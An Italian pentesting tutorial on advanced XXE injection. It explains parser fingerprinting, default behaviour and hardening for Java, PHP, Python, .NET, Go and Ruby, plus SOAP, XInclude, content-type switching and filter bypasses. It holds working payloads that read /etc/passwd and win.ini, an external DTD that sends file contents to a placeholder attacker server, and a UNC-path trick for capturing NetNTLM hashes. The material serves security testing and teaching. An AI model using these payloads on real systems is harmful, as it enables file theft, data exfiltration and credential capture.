---
title: 'XXE Injection avanzata: parser XML, XInclude, SOAP e bypass'
slug: xxe-injection
description: 'XXE Injection avanzata: identifica il parser XML, confronta Java, PHP, Python e .NET, testa SOAP, XInclude, content-type switching e bypass mirati.'
image: /xxe-injection-xml-external-entity.webp
draft: true
date: 2026-08-16T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - XXE Injection
  - XML Parser
  - XInclude
  - SOAP
  - Content-Type Switching
  - Java XXE
---

# XXE Injection: Parser Specifici, Fingerprinting e Tecniche Avanzate

La guida [xxe](https://hackita.it/articoli/xxe) copre i concetti base e i payload principali. Questo articolo va più in profondità: come identificare quale parser XML sta usando l'applicazione, come ogni parser si comporta diversamente, e le tecniche di injection che funzionano solo in contesti specifici — SOAP, XInclude, content-type switching. Copre anche l'enumerazione WSDL come ricognizione preliminare, non come tecnica di exploitation a sé.

Capire il parser è fondamentale perché **non tutti i parser sono vulnerabili allo stesso modo**, e il comportamento cambia non solo da linguaggio a linguaggio ma da versione a versione, da flag a flag. Sapere su cosa stai testando ti evita di sprecare tempo su payload che non possono funzionare — ma nessun indicatore da solo ti dà la certezza: lo vedrai nella sezione fingerprinting.

***

## Come Funziona l'Injection: La Meccanica del DTD

Per capire i bypass e le varianti, devi capire la struttura DTD (Document Type Definition) in due contesti diversi: il DTD **interno** (dentro il documento che mandi) e il DTD **esterno** (un file che ospiti tu su un altro server). La distinzione conta perché alcune tecniche funzionano solo nel secondo caso.

### DTD Interno: Entità Generali

Un'entità generale (`&nome;`) può essere dichiarata ed espansa direttamente nel DTD interno — è la forma "semplice" che hai già visto nella guida base:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### DTD Esterno: Entità Parametro ed Espansione Dinamica

Le entità parametro (`%nome;`) si usano SOLO dentro un DTD, mai nel corpo del documento, e servono a costruire dinamicamente altre entità. Qui c'è un vincolo importante della specifica XML: **una entità parametro non può comparire dentro una singola dichiarazione di markup nel DTD interno** — cioè il trucco "leggi un file e incollalo in un URL" (quello usato per il blind XXE) funziona solo se lo metti in un **DTD esterno**, non nel DOCTYPE che mandi direttamente al target.

```xml
<!-- Il documento che mandi al target si limita a richiamare il DTD esterno: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://TUO_SERVER/evil.dtd">
  %dtd;
]>
<root>x</root>
```

```dtd
<!-- evil.dtd, ospitato sul tuo server — qui dentro l'espansione dinamica È valida -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY esfil SYSTEM 'http://TUO_SERVER/?x=%file;'>">
%eval;
<!ENTITY % exfil "<!ENTITY &#x25; dummy '&esfil;'>">
```

In pratica: `%file` legge il file, `%eval` costruisce (dentro il DTD esterno) una nuova entità `esfil` che contiene già l'URL con il file incollato dentro, e quell'entità viene poi richiamata per far partire la richiesta HTTP verso di te con il contenuto in coda. Se provi a scrivere questa stessa catena dentro il DOCTYPE del documento principale (DTD interno), il parser la rifiuta o la ignora — per questo il DTD esterno non è solo "più comodo", è **necessario** per il blind XXE dinamico.

***

## Fingerprinting del Parser: Identificare il Target

Il parser determina quali tecniche funzionano, ma nessun singolo segnale ti dà la certezza — sono indizi da combinare. Vale la pena distinguere tre livelli: **indizio** (possibile, da verificare), **evidenza forte** (probabile, ma non definitiva), **conferma** (hai visto il comportamento con i tuoi occhi).

### Da Stack Trace e Header — Indizio, non Conferma

Uno stack trace o un header ti dicono quale **libreria o runtime** è in uso, non quale **configurazione** sta girando in quel momento — la stessa libreria può essere vulnerabile o sicura a seconda di come è stata istanziata nel codice dell'applicazione.

```bash
# Errori XML rivelano il parser nella stack trace
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><root><malformed>'

# Java parsers:
# "org.xml.sax.SAXParseException" → SAX parser (Java)
# "com.sun.org.apache.xerces" → Xerces (Java)
# "javax.xml.parsers.DocumentBuilderFactory" → JAXP (Java)
# "org.dom4j" → DOM4J (Java)

# PHP:
# "Warning: SimpleXMLElement::__construct()" → SimpleXML (PHP)
# "DOMDocument::loadXML()" → DOM (PHP)
# "XMLReader" → XMLReader (PHP)

# Python:
# "xml.etree.ElementTree" → stdlib ET
# "lxml.etree" → lxml (dipende dalla versione, vedi sezione dedicata)
# "defusedxml" → sicuro by design

# .NET:
# "System.Xml.XmlDocument" → XmlDocument (.NET)
# "System.Xml.XmlReader" → XmlReader (.NET)

# Ruby:
# "Nokogiri::XML" → Nokogiri
# "REXML::Document" → REXML

# Header HTTP — indicano stack/runtime, MAI il parser XML effettivo o la sua config
curl -sI "https://target.com/" | grep -iE "x-powered|server|x-aspnet"
# X-Powered-By: ASP.NET → runtime .NET (nient'altro)
# Server: JBoss/7.1 → runtime Java su JBoss/Wildfly (nient'altro)
# X-Powered-By: PHP/7.4 → runtime PHP 7.x — da verificare comunque flag e libxml2
# X-Powered-By: PHP/8.1 → runtime PHP 8.x — di norma più sicuro, ma non garantito
```

### Con Payload di Probe Differenziali — Evidenza Forte

```xml
<!-- Probe 1: il parser risolve entità interne? -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "PROBE123">]>
<root>&test;</root>
<!-- "PROBE123" nella risposta → segnale positivo (DTD processato).
     Ma la sua ASSENZA non prova che il DTD sia disabilitato:
     magari il parser lo processa comunque, semplicemente
     l'applicazione non restituisce quel valore in risposta. -->

<!-- Probe 2: il parser risolve entità esterne HTTP? -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test SYSTEM "http://COLLABORATOR.net/probe2">]>
<root>&test;</root>
<!-- COLLABORATOR.net è un dominio che tieni sotto controllo (es. Burp
     Collaborator, o un tuo server): se il target ci si connette, lo vedi
     nei log. Callback ricevuto → conferma: external entities abilitate.
     Nessun callback NON conferma il contrario: può essere egress
     filtering (il firewall del target blocca le connessioni in uscita
     verso internet), DNS che non esce, un proxy in mezzo, una struttura
     XML sbagliata nel tuo payload, o codice che semplicemente non
     usa il nodo che hai modificato. Prova più angolazioni prima
     di concludere che è sicuro. -->

<!-- Probe 3: il parser risolve entità parametro in DTD esterno? -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://COLLABORATOR.net/probe3.dtd">
  %dtd;
]>
<root>x</root>
<!-- Callback su /probe3.dtd → conferma: DTD esterni caricati,
     blind XXE via parameter entity possibile. -->
```

Anche "nessun errore di parsing" da solo non è sufficiente per confermare che l'endpoint accetti davvero XML come formato — potrebbe semplicemente ignorare il body senza validarlo.

***

## Parser Java: Default, Provider JAXP e Configurazioni Vulnerabili

Java ha la situazione più complessa: decine di implementazioni diverse (Xerces — il parser incluso di default nel JDK — Woodstox, e altri provider che cambiano da JDK a JDK), ognuna con comportamento potenzialmente diverso. In molte configurazioni di default le external entity risultano abilitate — è tra le piattaforme più a rischio in produzione, ma va sempre verificato caso per caso, non assunto.

### DocumentBuilderFactory (JAXP)

JAXP è l'API standard di Java per processare XML, integrata nel JDK. `DocumentBuilderFactory` è la classe che usi per costruire un parser DOM — cioè un parser che carica tutto il documento in memoria come albero di nodi navigabile. È probabilmente il modo più comune in cui vedrai XML parsato in un'app Java.

```java
// Spesso VULNERABILE se lasciato con le impostazioni di default:
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);

// Hardening completo:
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
try {
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
} catch (ParserConfigurationException e) {
    // Alcune feature non sono supportate da tutte le implementazioni JAXP:
    // se una setFeature lancia eccezione, NON significa che il parser sia sicuro —
    // va gestita esplicitamente (fail-closed), non ignorata in silenzio.
    throw new RuntimeException("Hardening XML non applicabile su questo provider", e);
}
DocumentBuilder builder = factory.newDocumentBuilder();
```

```bash
# Come identificarlo durante un pentest:
# Stack trace: "javax.xml.parsers.DocumentBuilderFactory"
# Header: applicazione Java EE su Tomcat/JBoss/Wildfly/WebLogic (indizio, non conferma)

curl -X POST "https://target.com/api" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### SAXParserFactory

SAX è un altro modo di parsare XML: invece di caricare tutto in memoria come DOM, legge il documento riga per riga e chiama funzioni di callback man mano che trova tag e testo — più leggero su file grandi, ma con la stessa identica falla se non lo configuri.

```java
// Spesso VULNERABILE se lasciato di default:
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser saxParser = spf.newSAXParser();

// Hardening: oltre a disallow-doctype-decl, disabilita anche le entity esterne
// e il caricamento del DTD esterno.
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### XMLInputFactory (StAX)

StAX è un terzo modello di parsing: a differenza di SAX (che ti spinge i dati con callback), qui sei tu a chiedere "dammi il prossimo pezzo" quando vuoi — più controllo, stesso rischio XXE se le entità esterne restano abilitate.

```java
// In molte implementazioni, IS_SUPPORTING_EXTERNAL_ENTITIES è true di default:
XMLInputFactory factory = XMLInputFactory.newInstance();

// Hardening:
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, Boolean.FALSE);
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
```

### DOM4J, SAXReader, SAXBuilder

Queste non sono parte di JAXP: sono librerie esterne, alternative più comode da usare rispetto all'API standard di Java, molto diffuse in applicazioni enterprise più datate. **DOM4J** è una libreria XML con la sua API ad albero; **SAXReader** è la classe di DOM4J che legge il documento (si appoggia a SAX sotto il cofano, da cui il nome); **SAXBuilder** è l'equivalente in **JDOM**, un'altra libreria simile a DOM4J. Tutte e tre, se non configurate esplicitamente, ereditano lo stesso problema: DTD ed entità esterne abilitate.

```java
// DOM4J spesso VULNERABILE di default:
SAXReader reader = new SAXReader();
Document doc = reader.read(inputStream);

// Hardening:
SAXReader reader = new SAXReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// SAXBuilder (JDOM) — stesso discorso, dipende dalla versione:
SAXBuilder builder = new SAXBuilder();
Document doc = builder.build(inputStream);

// Hardening:
SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

***

## Parser PHP: Dipende da Versione, libxml2 e Flag — Non Solo dalla Versione

`libxml2` è la libreria C che sta sotto quasi tutte le funzioni XML di PHP (e non solo — la usa anche Python tramite lxml). PHP di per sé non "decide" se le entità esterne sono abilitate: lo decide questa libreria, più i flag che il codice PHP passa quando la chiama. Per questo il runtime PHP da solo non basta per concludere se un endpoint è vulnerabile: conta la versione di libxml2, e soprattutto i flag passati esplicitamente dal codice dell'applicazione.

```bash
curl -sI "https://target.com/" | grep "X-Powered-By"
# X-Powered-By: PHP/7.4.33 → runtime datato, verifica libxml_disable_entity_loader
# X-Powered-By: PHP/8.1.27 → external entity disabilitate di default via libxml2,
#                             MA controlla comunque i flag passati a loadXML/simplexml
```

```php
// PHP 7.x — se il codice non chiama libxml_disable_entity_loader(true) prima:
$xml = simplexml_load_string($user_input);  // potenzialmente vulnerabile
$dom = new DOMDocument();
$dom->loadXML($user_input);                 // potenzialmente vulnerabile

// Hardening PHP < 8.0:
libxml_disable_entity_loader(true);  // chiamalo PRIMA di qualsiasi parsing
$xml = simplexml_load_string($user_input);

// ATTENZIONE: LIBXML_NOENT riabilita l'espansione delle entità
// (incluse quelle esterne) anche su PHP 8.0+, annullando la protezione di default:
$dom->loadXML($user_input, LIBXML_NOENT);  // vulnerabile anche su PHP 8+

// PHP 8.4 introduce il flag LIBXML_NO_XXE per disabilitare esplicitamente
// il caricamento di entità esterne, quando supportato dalla libxml2 di sistema.
```

```bash
# Cerca flag pericolosi in codice PHP esposto (config errate, debug mode, LFI):
curl "https://target.com/phpinfo.php" | grep -i "libxml"
# file:///var/www/html/upload.php → il codice sorgente contiene LIBXML_NOENT?
```

***

## Parser Python

```python
# xml.etree.ElementTree (stdlib) — NON espande external entity SYSTEM:
# un DOCTYPE con entità esterna tipicamente genera un ParseError invece di
# leggere il file o fare la richiesta di rete. Il rischio residuo è DoS
# (tipo Billion Laughs), e dipende dalla versione di Expat — il parser C
# di basso livello su cui ElementTree si appoggia per leggere l'XML —
# non è un canale di file read/SSRF diretto.
import xml.etree.ElementTree as ET
tree = ET.parse(user_file)

# lxml — QUI la versione conta davvero:
# fino alla serie 4.x, resolve_entities=True era il comportamento di default
# (quindi vulnerabile se non disattivato esplicitamente);
# da lxml 5.0 il default è cambiato a "internal" (entità interne sì,
# esterne no); lxml 6.1.0 ha corretto separatamente un percorso XXE
# in iterparse() ed ETCompatXMLParser — quindi verifica sempre la
# versione esatta in uso, non fermarti al major.
from lxml import etree
# Esplicitamente VULNERABILE:
parser = etree.XMLParser(resolve_entities=True, no_network=False)
# Hardening esplicito (consigliato indipendentemente dalla versione):
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(user_file, parser)

# defusedxml — sicuro by design, blocca XXE e Billion Laughs a prescindere
# dalla configurazione sottostante:
import defusedxml.ElementTree as ET
tree = ET.parse(user_file)
```

```bash
# Come identificare Python durante pentest:
# Stack trace: "xml.etree.ElementTree.ParseError"
# Header: "Server: gunicorn", "X-Powered-By: Flask" (indizio di stack, non del parser)
curl "https://target.com/requirements.txt"
# lxml==3.8.0 → versione vecchia, verifica se resolve_entities è stato disattivato esplicitamente
```

***

## Parser .NET

Anche qui la classificazione per versione è solo un punto di partenza: contano il target framework, la configurazione esplicita, e soprattutto il tipo di `XmlReader` passato al parser.

```csharp
// .NET Framework più datati — XmlDocument spesso VULNERABILE se lasciato di default:
XmlDocument doc = new XmlDocument();
doc.Load(stream);

// Hardening esplicito:
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // disabilita la risoluzione di risorse esterne
doc.Load(stream);

// XmlReader — sicuro per design in molte versioni recenti, MA dipende dal resolver:
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // hardening esplicito
XmlReader reader = XmlReader.Create(stream, settings);

// LINQ to XML (XDocument) — non espande external entity di default,
// MA diventa insicuro se gli passi un XmlReader dotato di resolver esterno attivo:
XmlReaderSettings settings = new XmlReaderSettings { XmlResolver = new XmlUrlResolver() }; // rischio
XDocument doc = XDocument.Load(XmlReader.Create(stream, settings));  // ora vulnerabile
```

```bash
# Come identificare .NET:
curl -sI "https://target.com/" | grep -iE "x-aspnet|x-powered"
# X-Powered-By: ASP.NET → runtime .NET (indizio)
# Server: Microsoft-IIS/10.0 → runtime .NET su IIS (indizio)

curl -X POST "https://target.com/api/import" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
```

***

## Go e Ruby: Comportamenti Specifici

```go
// La libreria standard Go encoding/xml non risolve DTD né entità esterne —
// questo copre la libreria standard, non l'intera piattaforma:
// se l'applicazione usa librerie terze per XML, wrapper attorno a librerie C
// (es. libxml2 tramite cgo), o passa l'output a una pipeline successiva
// (conversione, rendering), quel punto va verificato separatamente.
import "encoding/xml"
xml.Unmarshal(data, &result)
```

```ruby
# Nokogiri — external entities disabilitate di default da Nokogiri 1.5.4+:
require 'nokogiri'
doc = Nokogiri::XML(input)

# VULNERABILE se il codice abilita esplicitamente noent:
doc = Nokogiri::XML(input) { |c| c.noent }  # riabilita l'espansione → XXE
# Cerca "c.noent" o ".noent" nel codice sorgente esposto

# REXML — storicamente esposta a Billion Laughs / entity expansion DoS
# su versioni Ruby più datate; verifica sempre la versione di Ruby/REXML
# in uso prima di escludere il rischio:
require 'rexml/document'
doc = REXML::Document.new(input)
```

***

## SOAP Injection: Il Vettore Enterprise

I servizi SOAP sono XML puro — ogni request è un documento XML. Sono tra i target più ricchi per XXE perché spesso sono vecchi, mal mantenuti, e usano parser Java legacy con default vulnerabili.

```bash
# Identifica endpoint SOAP
# - URL con /soap, /ws, /service, /wsdl, ?wsdl, ?WSDL
# - Content-Type: text/xml + SOAPAction header
# - Risposta con <Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/">

# Enumerazione WSDL — ricognizione, non exploitation: il WSDL è il documento
# XML che descrive quali metodi offre il servizio SOAP e che parametri
# si aspettano — scopri i metodi disponibili prima ancora di attaccare
curl "https://target.com/service?wsdl"
# Mostra tutti i metodi SOAP e i tipi di parametri → superficie d'attacco da testare dopo

# Payload XXE in una request SOAP
curl -X POST "https://target.com/soap/UserService" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H 'SOAPAction: "GetUser"' \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:usr="http://example.com/users">
  <soapenv:Header/>
  <soapenv:Body>
    <usr:GetUser>
      <usr:userId>&xxe;</usr:userId>
    </usr:GetUser>
  </soapenv:Body>
</soapenv:Envelope>'
```

***

## XInclude: Quando Non Controlli il DOCTYPE

Alcuni endpoint non permettono di definire un DOCTYPE (lo strippano o lo bloccano), ma includono il tuo input come parte di un documento XML più grande. In questo caso non puoi usare la tecnica standard — ma puoi usare **XInclude**, una specifica XML per includere file o URL in un documento senza bisogno di DOCTYPE (usa solo un namespace).

```xml
<!-- XInclude: leggi /etc/passwd senza DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- In una request API dove il tuo valore viene embeddato in XML: -->
<!-- L'API riceve: <root><user>TUOINPUT</user></root> -->
<!-- Tu mandi come TUOINPUT: -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- Richiede che il parser abbia XInclude abilitato e lo processi attivamente:
     Java: DocumentBuilderFactory.setXIncludeAware(true)
     lxml: NON esiste il parametro xinclude= in XMLParser — si parsa
           normalmente e poi si chiama tree.xinclude() sull'albero risultante,
           oppure si usa il modulo lxml.ElementInclude
     libxml2: la funzione xmlXIncludeProcess() deve essere chiamata esplicitamente -->
```

```python
# lxml — sintassi corretta per processare XInclude:
from lxml import etree
tree = etree.parse(user_file)
tree.xinclude()  # processa le direttive xi:include sull'albero già parsato
```

***

## Content-Type Switching: XXE su API JSON

Alcune API accettano sia JSON che XML ma la documentazione mostra solo JSON. Se cambi il `Content-Type` e il backend accetta entrambi, hai un vettore XXE nascosto.

```bash
# Request normale JSON
POST /api/users/search HTTP/1.1
Content-Type: application/json
{"query": "mario"}

# Prova a passare a XML
POST /api/users/search HTTP/1.1
Content-Type: text/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<query>&xxe;</query>

# Varianti di Content-Type XML da provare:
# text/xml
# application/xml
# application/soap+xml
# qualunque media type application/*+xml specifico dell'API

# Con Burp: intercetta una request JSON → cambia Content-Type → manda payload XXE
# Un "nessun errore di parsing" è un indizio da approfondire, non una conferma
# che il backend stia davvero trattando il body come XML.
```

***

## Formati Basati su XML: Vettori Meno Ovvi

Non sono file "travestiti" — sono formati che per specifica SONO XML, e quindi ereditano lo stesso rischio se il parser che li apre non è protetto.

```bash
# SVG e DOCX/XLSX sono già trattati in dettaglio nella guida xxe

# GPX (GPS exchange format — XML)
cat > track.gpx << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<gpx version="1.1">
  <name>&xxe;</name>
</gpx>
EOF

# RSS/Atom
cat > feed.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0">
  <channel><title>&xxe;</title></channel>
</rss>
EOF
```

Anche SAML rientra in questa categoria: il parametro `SAMLResponse` in un flusso SSO è XML codificato in base64. In teoria è un altro punto dove un parser non protetto processerebbe un DOCTYPE malevolo — in pratica, però, un `SAMLResponse` modificato invalida quasi sempre la firma digitale del provider, quindi questo vettore ha senso solo se l'endpoint valida il DOCTYPE **prima** di validare la firma, oppure non valida affatto la firma (un problema di configurazione a sé, non una tecnica XXE garantita). Vale la pena testarlo, ma senza aspettarsi che funzioni per default.

***

## Bypass di Filtri Comuni

### Filtro sul DOCTYPE

```xml
<!-- Se l'applicazione rimuove <!DOCTYPE ..., prova XInclude (vedi sopra) -->

<!-- Encoding alternativo del DOCTYPE -->
<?xml version="1.0" encoding="UTF-16"?>
<!-- Alcuni filtri cercano "<!DOCTYPE" in UTF-8 ma non in UTF-16 -->
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>'''
with open('payload.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
"
```

### Filtro su "file://"

```xml
<!-- Se "file://" è filtrato, prova varianti del protocollo -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">      <!-- standard -->
<!ENTITY xxe SYSTEM "FILE:///etc/passwd">      <!-- uppercase -->
<!ENTITY xxe SYSTEM "file://localhost/etc/passwd">  <!-- con hostname -->
<!ENTITY xxe SYSTEM "/etc/passwd">             <!-- path assoluto (alcuni parser) -->

<!-- Su Windows -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file://ATTACKER/share">   <!-- UNC path → può forzare autenticazione SMB -->
```

### Filtro su Caratteri Speciali nel Valore

Se il contenuto del file ha caratteri che rompono l'XML (`<`, `>`, `&`), la soluzione affidabile è specifica di PHP: `php://filter` codifica il file in base64 prima di inserirlo nell'entità, così dentro l'XML finiscono solo caratteri sicuri.

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

***

## Tool Specifici per XXE

```bash
# xxeserv — server per ricevere dati esfiltrati via XXE (HTTP/altri protocolli)
go install github.com/staaldraad/xxeserv@latest
xxeserv -w -p 80  # vedi -h per tutte le opzioni (-w, -wp, -p, -uno, -o)

# Burp Collaborator — il più semplice per OOB (DNS + HTTP)
# Nel payload: usa il tuo Collaborator URL come SYSTEM

# interactsh — alternativa open source
interactsh-client
# Genera dominio: abc123.oast.fun → usa nel payload

# BApp Store — estensioni Burp utili per questo tipo di test:
# Content Type Converter → per il content-type switching
# SAML Raider → per manipolare e testare SAMLResponse
# Office Open XML Editor → per modificare XML dentro docx/xlsx direttamente in Burp

# Nuclei — template blind XXE generico
nuclei -u https://target.com -tags xxe
nuclei -u https://target.com/soap/endpoint \
  -t http/vulnerabilities/generic/generic-blind-xxe.yaml
```

***

## Checklist Avanzata

```
FINGERPRINTING (indizio → evidenza forte → conferma)
☐ Header HTTP: PHP versione? Java server? .NET? (indizio di stack, non del parser)
☐ Stack trace XML: quale libreria è menzionata? (indizio)
☐ Probe entità interne: PROBE123 riflesso? (evidenza forte se sì; assenza non conclusiva)
☐ Probe entità esterne HTTP: callback ricevuto? (conferma se sì; assenza non conclusiva)
☐ Probe entità parametro: DTD esterno caricato? (conferma per blind XXE)

PARSER-SPECIFIC
☐ Java: mancano setXIncludeAware(false), ACCESS_EXTERNAL_DTD/SCHEMA?
☐ PHP: libxml_disable_entity_loader chiamata (< 8.0)? LIBXML_NOENT presente nel codice?
☐ Python: lxml — quale versione esatta, e resolve_entities impostato esplicitamente?
☐ Ruby: Nokogiri con .noent abilitato nel codice?
☐ .NET: XmlResolver esplicito passato a XmlDocument/XDocument?
☐ Go: solo stdlib in uso, o anche librerie terze/wrapper C da verificare?

VETTORI NASCOSTI
☐ Content-Type switching: API JSON accetta anche text/xml o application/*+xml?
☐ XInclude testato (quando DOCTYPE è filtrato)?
☐ Formati XML meno ovvi testati: GPX, RSS, SAML, DOCX/XLSX?
☐ SOAP endpoint trovati (/wsdl, ?wsdl)? WSDL enumerato per tutti i metodi?

BYPASS FILTRI
☐ DOCTYPE filtrato → XInclude
☐ file:// filtrato → FILE://, file://localhost/, /path (Unix), UNC (Windows)
☐ Contenuto con caratteri XML speciali → php://filter base64 (PHP)
☐ UTF-16 encoding testato (bypass filtri UTF-8)

DOCUMENTAZIONE
☐ Parser e versione identificati (non solo il runtime)
☐ Vettore di injection specificato
☐ Payload usato documentato
☐ Dati estratti o callback OOB come prova
```

***

## FAQ

**Perché l'assenza di callback non esclude una XXE?**
Un test OOB negativo può dipendere da tanti fattori diversi dalla "sicurezza" del parser: egress filtering che blocca le connessioni in uscita, DNS che non risolve verso l'esterno, un proxy interposto, una struttura XML sbagliata nel payload, o codice applicativo che semplicemente non usa il nodo che hai modificato. Prima di concludere che l'endpoint non è vulnerabile, prova angolazioni diverse: DNS al posto di HTTP, error-based, punti di injection diversi nello stesso documento.

**XInclude funziona sempre come alternativa al DOCTYPE?**
No. Richiede che il parser abbia XInclude abilitato e che lo processi attivamente. Java lo fa con `setXIncludeAware(true)`; in lxml si parsa normalmente e poi si chiama `tree.xinclude()` sull'albero (non esiste un parametro `xinclude=` in `XMLParser`); in libxml2 serve una chiamata esplicita a `xmlXIncludeProcess()`. Se il parser non ha XInclude abilitato, il markup viene semplicemente ignorato.

**LIBXML\_NOENT in PHP 8 è davvero pericoloso?**
Sì. PHP 8.0+ disabilita le external entity di default tramite libxml2 — ma se il codice passa esplicitamente `LIBXML_NOENT` a `loadXML()` o `simplexml_load_string()`, riabilita l'espansione delle entità, incluse quelle esterne. PHP 8.4 introduce `LIBXML_NO_XXE` per disabilitarle in modo esplicito, quando supportato dalla libxml2 di sistema — ma resta un'opzione da attivare, non un default garantito su tutte le versioni.

**Come sfrutto un UNC path via XXE su Windows?**
Un'entità che punta a `file://ATTACKER_IP/share` può far tentare al server Windows un'autenticazione SMB verso il tuo host per accedere al path. Con Responder in ascolto puoi catturare la risposta NetNTLM (non una password in chiaro, ma un hash da usare in attacchi successivi tipo relay con [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx) o cracking offline). Nota: molti ambienti bloccano l'autenticazione SMB in uscita a livello di rete o firewall, quindi non è garantito che il traffico esca davvero.

***

## Risorse

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [Specifica XML W3C](https://www.w3.org/TR/xml/)

***

> Il parser Java ha le external entity abilitate in molte configurazioni di default. La documentazione lo dice chiaramente. Quasi nessuno la controlla riga per riga.
